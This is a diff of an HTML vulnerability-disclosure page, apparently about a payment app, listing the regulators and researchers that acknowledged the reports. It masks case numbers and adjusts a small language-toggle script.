-        <li><strong>Apple Product Security</strong> — Proactively launched investigation (Case OE01052449093014)</li>
-        <li><strong>Google Play</strong> — Policy violation investigation (Case 9-7515000040640)</li>
+        <li><strong>MITRE</strong> — 36 CVE submissions across 11 tickets acknowledged</li>
+        <li><strong>Apple Product Security</strong> — Proactively launched investigation (Case OE0105****3014)</li>
+        <li><strong>Google Play</strong> — Policy violation investigation (Case 9-7515****0640)</li>
         <li><strong>CSSF Luxembourg</strong> — 4 departments confirmed receipt, ICT Risk Supervision explicitly noted</li>
-        <li><strong>PDPC Singapore</strong> — Formal data protection investigation (#00629724)</li>
+        <li><strong>PDPC Singapore</strong> — Formal data protection investigation (#006****24)</li>
         <li><strong>CIRCL Luxembourg CERT</strong> — Incident handler proactively contacted Alibaba SRC on our behalf</li>
-        <li><strong>HKMA Hong Kong</strong> — Case filed (CE20260313175412)</li>
+        <li><strong>HKMA Hong Kong</strong> — Case filed (CE2026****5412)</li>
         <li><strong>cxxsheng</strong> (GitHub researcher) — Independently wrote PoC and confirmed vulnerability exists</li>
         <li><strong>freshnn</strong> (GitHub user) — Independently confirmed silent GPS reproduction on Android</li>
       </ul>
@@ -2622,14 +2799,14 @@ Language/zh-Hant Region/CN</code></pre>
 
 <script>
 function setLang(lang) {
-  document.body.className = lang === 'en' ? 'lang-en' : '';
+  document.body.className = lang === 'zh' ? 'lang-zh' : '';
   document.getElementById('btn-zh').className = lang === 'zh' ? 'active' : '';
   document.getElementById('btn-en').className = lang === 'en' ? 'active' : '';
   localStorage.setItem('zfb-lang', lang);
 }
 // Restore language preference
 var saved = localStorage.getItem('zfb-lang');
-if (saved) setLang(saved);
+if (saved === 'zh') setLang('zh');
 </script>
 
 </body>
